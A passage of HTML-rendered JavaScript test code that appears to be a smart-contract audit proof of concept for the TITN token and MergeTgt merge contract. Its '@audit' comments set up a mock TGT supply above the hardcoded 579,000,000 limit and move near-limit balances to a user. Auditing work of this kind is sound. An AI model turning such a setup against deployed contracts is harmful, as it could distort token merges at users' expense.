class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk12\"\u003eaddress\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e)\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk15\"\u003eawait\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003emockEndpointV2B\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk11\"\u003esetDestLzEndpoint\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003ebaseTITN\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk12\"\u003eaddress\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e, \u003c/span\u003e\u003cspan class=\"mtk12\"\u003emockEndpointV2A\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk12\"\u003eaddress\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e)\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk3\"\u003e// Setting each TITN instance as a peer of the other in the mock LZEndpoint\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk15\"\u003eawait\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003ebaseTITN\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk11\"\u003econnect\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003eownerA\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e).\u003c/span\u003e\u003cspan class=\"mtk11\"\u003esetPeer\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003eeidB\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e, \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eethers\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk12\"\u003eutils\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk11\"\u003ezeroPad\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003earbTITN\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk12\"\u003eaddress\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e, \u003c/span\u003e\u003cspan class=\"mtk7\"\u003e32\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e))\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk15\"\u003eawait\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003earbTITN\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk11\"\u003econnect\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003eownerB\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e).\u003c/span\u003e\u003cspan class=\"mtk11\"\u003esetPeer\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003eeidA\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e, \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eethers\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk12\"\u003eutils\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk11\"\u003ezeroPad\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003ebaseTITN\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk12\"\u003eaddress\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e, \u003c/span\u003e\u003cspan class=\"mtk7\"\u003e32\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e))\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk3\"\u003e// Defining the amount of tokens to send and constructing the parameters for the send operation\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk4\"\u003econst\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003etokensToSend\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e = \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eethers\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk12\"\u003eutils\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk11\"\u003eparseEther\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk8\"\u003e\u0026#39;173700000\u0026#39;\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e)\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk3\"\u003e// Defining extra message execution options for the send operation\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk4\"\u003econst\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eoptions\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e = \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eOptions\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk11\"\u003enewOptions\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e().\u003c/span\u003e\u003cspan class=\"mtk11\"\u003eaddExecutorLzReceiveOption\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk7\"\u003e200000\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e, \u003c/span\u003e\u003cspan class=\"mtk7\"\u003e0\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e).\u003c/span\u003e\u003cspan class=\"mtk11\"\u003etoHex\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e().\u003c/span\u003e\u003cspan class=\"mtk11\"\u003etoString\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e()\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk4\"\u003econst\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003esendParam\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e = [\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e            \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eeidB\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e,\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e            \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eethers\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk12\"\u003eutils\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk11\"\u003ezeroPad\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003eownerB\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk12\"\u003eaddress\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e, \u003c/span\u003e\u003cspan class=\"mtk7\"\u003e32\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e),\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e            \u003c/span\u003e\u003cspan class=\"mtk12\"\u003etokensToSend\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e,\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e            \u003c/span\u003e\u003cspan class=\"mtk12\"\u003etokensToSend\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e,\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e            \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eoptions\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e,\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e            \u003c/span\u003e\u003cspan class=\"mtk8\"\u003e\u0026#39;0x\u0026#39;\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e,\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e            \u003c/span\u003e\u003cspan class=\"mtk8\"\u003e\u0026#39;0x\u0026#39;\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e,\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        ]\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk3\"\u003e// Fetching the native fee for the token send operation\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk4\"\u003econst\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e [\u003c/span\u003e\u003cspan class=\"mtk12\"\u003enativeFee\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e] = \u003c/span\u003e\u003cspan class=\"mtk15\"\u003eawait\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003ebaseTITN\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk11\"\u003equoteSend\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003esendParam\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e, \u003c/span\u003e\u003cspan class=\"mtk4\"\u003efalse\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e)\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk3\"\u003e// Executing the send operation from TITN contract\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk15\"\u003eawait\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003ebaseTITN\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk11\"\u003esend\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003esendParam\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e, [\u003c/span\u003e\u003cspan class=\"mtk12\"\u003enativeFee\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e, \u003c/span\u003e\u003cspan class=\"mtk7\"\u003e0\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e], \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eownerA\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk12\"\u003eaddress\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e, { \u003c/span\u003e\u003cspan class=\"mtk12\"\u003evalue:\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003enativeFee\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e })\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk3\"\u003e// Deply MockTGT contract\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk3\"\u003e// @audit increased total supply above mergeTGT hardcoded 579_000_000\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk12\"\u003etgt\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e = \u003c/span\u003e\u003cspan class=\"mtk15\"\u003eawait\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eTgt\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk11\"\u003edeploy\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk8\"\u003e\u0026#39;Tgt\u0026#39;\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e, \u003c/span\u003e\u003cspan class=\"mtk8\"\u003e\u0026#39;TGT\u0026#39;\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e, \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eownerB\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk12\"\u003eaddress\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e, \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eethers\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk12\"\u003eutils\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk11\"\u003eparseUnits\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk8\"\u003e\u0026#39;100000000000\u0026#39;\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e, \u003c/span\u003e\u003cspan class=\"mtk7\"\u003e18\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e))\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk3\"\u003e// Deploy MergeTgt contract\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk12\"\u003emergeTgt\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e = \u003c/span\u003e\u003cspan class=\"mtk15\"\u003eawait\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eMergeTgt\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk11\"\u003edeploy\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003etgt\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk12\"\u003eaddress\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e, \u003c/span\u003e\u003cspan class=\"mtk12\"\u003earbTITN\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk12\"\u003eaddress\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e, \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eownerB\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk12\"\u003eaddress\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e)\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk3\"\u003e// Arbitrum setup\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk15\"\u003eawait\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003earbTITN\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk11\"\u003econnect\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003eownerB\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e).\u003c/span\u003e\u003cspan class=\"mtk11\"\u003esetTransferAllowedContract\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003emergeTgt\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk12\"\u003eaddress\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e)\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk15\"\u003eawait\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003emergeTgt\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk11\"\u003econnect\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003eownerB\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e).\u003c/span\u003e\u003cspan class=\"mtk11\"\u003esetLaunchTime\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e()\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk15\"\u003eawait\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003emergeTgt\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk11\"\u003econnect\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003eownerB\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e).\u003c/span\u003e\u003cspan class=\"mtk11\"\u003esetLockedStatus\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk7\"\u003e1\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e)\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk3\"\u003e// now the admin should deposit all ARB.TITN into the mergeTGT contract\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk15\"\u003eawait\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003earbTITN\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk11\"\u003econnect\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003eownerB\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e).\u003c/span\u003e\u003cspan class=\"mtk11\"\u003eapprove\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003emergeTgt\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk12\"\u003eaddress\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e, \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eethers\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk12\"\u003eutils\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk11\"\u003eparseUnits\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk8\"\u003e\u0026#39;173700000\u0026#39;\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e, \u003c/span\u003e\u003cspan class=\"mtk7\"\u003e18\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e))\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk15\"\u003eawait\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003emergeTgt\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk11\"\u003econnect\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003eownerB\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e).\u003c/span\u003e\u003cspan class=\"mtk11\"\u003edeposit\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003earbTITN\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk12\"\u003eaddress\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e, \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eethers\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk12\"\u003eutils\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk11\"\u003eparseUnits\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk8\"\u003e\u0026#39;173700000\u0026#39;\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e, \u003c/span\u003e\u003cspan class=\"mtk7\"\u003e18\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e))\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk3\"\u003e// let\u0026#39;s send some TGT to user1 and user2\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk3\"\u003e// @audit send close to 579_000_000 TGT to user1 (just above the mergeTGT hardcoded value)\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk15\"\u003eawait\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003etgt\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk11\"\u003econnect\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003eownerB\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e).\u003c/span\u003e\u003cspan class=\"mtk11\"\u003etransfer\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003euser1\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk12\"\u003eaddress\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e, \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eethers\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk12\"\u003eutils\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk11\"\u003eparseUnits\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk8\"\u003e\u0026#39;578999999\u0026#39;\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e, \u003c/span\u003e\u003cspan class=\"mtk7\"\u003e18\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e))\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk15\"\u003eawait\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003etgt\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk11\"\u003econnect\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003eownerB\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e).\u003c/span\u003e\u003cspan class=\"mtk11\"\u003etransfer\u003c/span\u003e\u003cspan 